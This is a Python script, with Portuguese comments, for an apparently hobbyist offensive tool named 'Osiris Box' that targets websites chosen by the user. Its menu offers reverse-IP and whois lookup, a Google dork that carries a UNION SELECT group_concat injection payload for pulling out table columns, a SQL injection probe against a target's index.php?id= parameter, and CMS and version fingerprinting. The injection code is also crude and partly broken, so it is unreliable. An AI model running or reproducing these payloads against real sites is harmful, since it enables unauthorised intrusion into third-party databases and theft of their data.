import os
from googlesearch import search
import requests
from bs4 import BeautifulSoup
import re

# Função para fazer a pesquisa de Reverse IP
def reverse_ip_lookup(site):
    # URL da API com o site a ser pesquisado
    url = f'https://api.hackertarget.com/reverseiplookup/?q={site}'
    # Faz a solicitação à API
    response = requests.get(url)
    # Se houver resultados, mostra-os
    if response.text:
        print(response.text)
        # Informações sobre a empresa
        whois_url = f'https://api.hackertarget.com/whois/?q={site}'
        whois_response = requests.get(whois_url)
        print(whois_response.text)
    else:
        print(f'Nenhum resultado encontrado para {site}')

# Função para criar Dork de SQL Injection
def criar_dork_sql_injection(tabela, coluna, site):
    dork = f'site:{site} inurl:index.php?id=1 \''
    dork += f'union select 1,group_concat({coluna}),3,4,5,6 from {tabela}--'
    return dork

# Função para identificar erro de SQL Injection (boolean-based blind)
def identificar_erro_sql_injection(tabela, coluna, site):
    query = f"SELECT COUNT(*) FROM {tabela} WHERE {coluna} = 'a' OR '1'='1'"
    url = f'https://{site}/index.php?id={query}'

    response = requests.get(url)
    
    if 'SQL syntax' in response.text or 'Unknown column' in response.text:
        print(f'Erro de SQL Injection identificado na tabela: {tabela}, coluna: {coluna}')
    else:
        print('Não foi possível identificar um erro de SQL Injection.')

# Função para identificar o CMS e a versão do site
def identificar_cms_e_versao(site):
    url = f'https://{site}'
    response = requests.get(url)

    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')

        # Verifica se há indicações comuns de CMS no cabeçalho HTTP ou no código-fonte
        if 'wp-content' in response.text:
            # Verifica se é WordPress e tenta extrair a versão
            versao = re.search(r'(?<=name="generator" content="WordPress )[\d.]+', response.text)
            return f'WordPress (Versão {versao.group()})' if versao else 'WordPress (Versão não identificada)'
        elif 'Joomla' in response.text:
            # Verifica se é Joomla e tenta extrair a versão
            versao = re.search(r'(?<=content="Joomla! )[\d.]+', response.text)
            return f'Joomla (Versão {versao.group()})' if versao else 'Joomla (Versão não identificada)'
        elif 'Drupal' in response.text:
            # Verifica se é Drupal e tenta extrair a versão
            versao = re.search(r'(?<=content="Drupal )[\d.]+', response.text)
            return f'Drupal (Versão {versao.group()})' if versao else 'Drupal (Versão não identificada)'
        else:
            return 'CMS não identificado'
    else:
        return 'Erro ao acessar o site'

# Função para exibir um banner com desenho ASCII
def exibir_banner_com_desenho():
    os.system("cls" if os.name == "nt" else "clear")  # Limpa a tela

    # Desenho ASCII com o nome "Osiris Box" e o Olho de Hórus
    banner = """
 .d88888b.           d8b         d8b               888888b.                     
d88P" "Y88b          Y8P         Y8P               888  "88b                    
888     888                                        888  .88P                    
888     888 .d8888b  888 888d888 888 .d8888b       8888888K.   .d88b.  888  888 
888     888 88K      888 888P"   888 88K           888  "Y88b d88""88b `Y8bd8P' 
888     888 "Y8888b. 888 888     888 "Y8888b.      888    888 888  888   X88K   
Y88b. .d88P      X88 888 888     888      X88      888   d88P Y88..88P .d8""8b. 
 "Y88888P"   88888P' 888 888     888  88888P'      8888888P"   "Y88P"  888  888 


                                                       
            Criado Por Marcos Roberto A/K/A VandaTheGod                                                                    
    
    """

    print(banner)

# Exibe o banner com desenho
exibir_banner_com_desenho()

# Adiciona 5 opções
print("1. Reverse IP Lookup")
print("2. Criar Dork de SQL Injection e pesquisar no Google")
print("3. Identificar erro de SQL Injection (boolean-based blind)")
print("4. Identificar CMS e versão do site")
print("5. Opção 5 (Ainda não implementada)")

# Solicita ao usuário para escolher uma opção
opcao = input('Escolha uma opção: ')

# Executa a ação correspondente à opção escolhida
if opcao == '1':
    site = input('Digite o site para a pesquisa de Reverse IP: ')
    reverse_ip_lookup(site)
elif opcao == '2':
    tabela = input('Digite o nome da tabela: ')
    coluna = input('Digite o nome da coluna: ')
    site = input('Digite o site alvo: ')
    dork = criar_dork_sql_injection(tabela, coluna, site)
    print(f'Dork de SQL Injection criado: {dork}')

    # Pesquisa no Google
    for j in search(dork, num=10, stop=10, pause=2):
        print(j)
elif opcao == '3':
    tabela = input('Digite o nome da tabela: ')
    coluna = input('Digite o nome da coluna: ')
    site = input('Digite o site alvo: ')
    identificar_erro_sql_injection(tabela, coluna, site)
elif opcao == '4':
    site = input('Digite o site para identificar o CMS e a versão: ')
    cms_e_versao_identificados = identificar_cms_e_versao(site)
    print(f'O CMS e a versão identificados para o site {site} são: {cms_e_versao_identificados}')
elif opcao == '5':
    # Adicione a lógica para a opção 5
    print('Ainda não implementada.')
else:
    print('Opção inválida. Por favor, escolha uma opção de 1 a 5.')
